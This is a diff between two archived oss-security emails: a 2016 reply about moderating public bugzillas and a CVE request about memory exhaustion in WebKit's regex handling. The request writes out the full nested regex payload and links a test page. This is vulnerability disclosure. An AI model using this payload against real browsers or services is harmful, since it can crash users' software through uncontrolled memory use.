@@ -1,56 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/10/12
-Message-ID: <56E17B10.1090800@igalia.com>
-Date: Thu, 10 Mar 2016 14:48:00 +0100
-From: Carlos Alberto Lopez Perez <clopez@...lia.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: RE: Concerns about CVE coverage shrinking - direct impact to researchers/companies
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/26/2
+Message-ID: <CACn5sdSfj16w6g_-WODTBY20AMFxw50qUJARvhhAByhR0yOrwg@mail.gmail.com>
+Date: Sat, 26 Nov 2016 15:11:44 -0300
+From: Gustavo Grieco <gustavo.grieco@...il.com>
+To: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: CVE Request: resource exhaustion in regex expression handling in WebKit
 Content-Type: text/plain; charset=utf-8
 
-On 10/03/16 07:23, Alan Coopersmith wrote:
-> On 03/ 9/16 04:22 PM, Carlos Alberto Lopez Perez wrote:
->> On 06/03/16 19:46, Alan Coopersmith wrote:
->>> On 03/ 4/16 04:07 PM, Tim wrote:
->>>> * No moderation required.  Let the public decide if they believe the
->>>>     researcher or vendor.  If a moderator does bother to look over the
->>>>     content, they could deduplicate/link issues together and address
->>>> any
->>>>     confusion, but beyond that, it isn't their job to decide what is a
->>>>     vulnerability and what isn't.
->>>
->>> If the site displays *any* user-submitted text, you need at least enough
->>> moderation to filter out spammers & trolls.
->>>
->>
->> I don't think you need that level of moderation if you implement basic
->> measures against spammers like requiring the creation of an account with
->> e-mail verification.
->>
->> Just look to all the public bugzillas out there that allow commenting
->> (mozilla, webkit, redhat, gnome, etc). I don't think they have a problem
->> with spam. But you have to create an account first to do any comment.
-> 
-> I'm one of the admins of the public bugzilla at bugs.freedesktop.org, and
-> I've had to deal with spam there, and I've seen reports of spams in other
-> public bugzillas for open source projects.
-> 
-> github requires account creation as well, and I'm sure we've all seen out
-> of control comment threads there that had to be locked down to stop abuse.
-> 
+Hello,
 
-Then the next level is to require not only e-mail validation but also to
-solve a captcha for creating a new account.
+Trying to parse and execute this regex code in WebKit:
 
-Or even harder, to require any account with less than 10 comments to
-solve a captcha for any new comment. That way the annoyance for legit
-users is temporal (up to the 10th comment), meanwhile for spammers is
-not, because their account is probably going to be blocked before they
-reach the 10th comment and have to start again with a new account.
+/($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(${-2,16}+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)/
 
-I'm not saying that some level of moderation is required. Of course it
-is. But I think that if proper antispam measures are implemented, then
-the level of moderation required is relatively low, and can be done by
-the bugzilla admins without much effort.
+will consume large amounts of memory (8GB or more), after a few seconds.
+This seems to be a case of CWE-400 (uncontrolled resource consumption).
 
+At least, version 2.4.11 Webkit and very recent webkit revisions like
+https://github.com/WebKit/webkit/commit/fcf81f3ad83cd910727c7a1824e503
+77a474c8f4 are affected.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (884 bytes)
+You can quickly test this issue in different webkit browsers here:
+
+https://dcc.fceia.unr.edu.ar/~ggrieco/oom.html
+
+Fortunately, Chrome and Firefox based browsers are *not* affected.
+
+Please assign a CVE if suitable. It is worth to mention, that a month ago,
+i asked to MITRE about another issue related with uncontrolled resource
+consumption in Firefox loading a SVG but receive no response.
+
+Regards,
+Gustavo.
+
